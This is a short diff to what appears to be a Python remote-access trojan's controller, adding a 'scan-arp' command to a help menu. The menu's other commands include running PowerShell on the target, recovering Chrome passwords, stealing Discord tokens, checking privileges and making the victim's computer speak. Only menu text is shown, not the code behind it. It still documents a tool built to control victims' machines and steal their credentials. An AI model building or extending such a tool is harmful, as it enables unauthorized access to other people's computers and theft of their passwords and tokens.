@@ -160,6 +160,7 @@ def target_communication(target, ip):
             run-pwr                            --> execute powershell command
             msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
             chrome_recon                       --> recover Chrome Passwords
+            scan-arp                           --> scan connected users in the client network
             disteal                            --> Get Discord tokens
             priv                               --> Check User Priv
             say                                --> make Target Computer talk ex: say something | 0=male or 1=female
